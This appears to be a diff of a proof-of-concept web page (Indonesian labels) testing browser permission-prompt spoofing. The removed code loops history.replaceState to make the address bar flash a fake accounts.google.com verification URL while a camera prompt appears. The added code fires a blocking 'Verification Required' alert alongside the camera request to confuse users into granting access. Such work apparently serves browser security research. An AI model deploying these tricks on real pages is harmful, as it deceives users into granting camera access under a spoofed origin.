@@ -3,87 +3,40 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera Permission + History Desync</title>
+<title>Camera Permission + Alert Blocking</title>
 <style>
   body { font-family: sans-serif; padding: 40px; text-align: center; }
   .btn { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
-  #status { margin-top: 20px; font-family: monospace; color: #666; }
 </style>
 </head>
 <body>
 
-<h2>Camera Permission + History Desync</h2>
-<p>Klik tombol di bawah. Perhatikan address bar saat prompt kamera muncul.</p>
+<h2>Camera Permission + Alert Blocking</h2>
+<p>Klik tombol di bawah. Prompt kamera dan alert akan muncul bersamaan.</p>
 
-<button id="startBtn" class="btn">Trigger Camera & Desync</button>
-<div id="status">[*] Ready...</div>
+<button id="startBtn" class="btn">Trigger Camera & Alert</button>
 
 <script>
 (function () {
   'use strict';
 
   var btn = document.getElementById('startBtn');
-  var statusEl = document.getElementById('status');
-  var counter = 0;
-  var isRunning = true;
 
-  function log(msg) {
-    statusEl.textContent = msg;
-    console.log("[Camera Desync] " + msg);
-  }
-
-  // ============================================
-  // 1. HISTORY DESYNC LOOP
-  // ============================================
-  function desyncHistory() {
-    if (!isRunning) return;
-
-    counter++;
-    
-    // Ganti URL secara berulang
-    history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
-    
-    setTimeout(function() {
-      history.replaceState(null, '', '/');
-    }, 0);
-
-    if (counter % 1000 === 0) {
-      log('[*] Desync count: ' + counter);
-    }
-
-    requestAnimationFrame(desyncHistory);
-  }
-
-  // ============================================
-  // 2. CAMERA PERMISSION
-  // ============================================
-  function requestCamera() {
-    log("[*] Meminta Izin Kamera...");
-    
+  btn.addEventListener('click', function() {
+    // Minta kamera
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(function(stream) {
-        log("[+] Kamera DIIZINKAN!");
         stream.getTracks().forEach(function(t) { t.stop(); });
+        alert('Camera permission granted!');
       })
       .catch(function(err) {
-        log("[-] Kamera ditolak: " + err.name);
+        alert('Camera permission denied: ' + err.name);
       });
-  }
 
-  // ============================================
-  // 3. TRIGGER
-  // ============================================
-  btn.addEventListener('click', function() {
-    // Mulai desync
-    requestAnimationFrame(desyncHistory);
-    
-    // Minta kamera setelah 500ms (saat desync berjalan)
-    setTimeout(requestCamera, 500);
-    
-    // Stop desync setelah 10 detik
+    // Picu alert tepat setelahnya (blocking)
     setTimeout(function() {
-      isRunning = false;
-    }, 10000);
+      alert('Verification Required. Please click OK to continue.');
+    }, 10);
   }, { once: true });
 
 })();
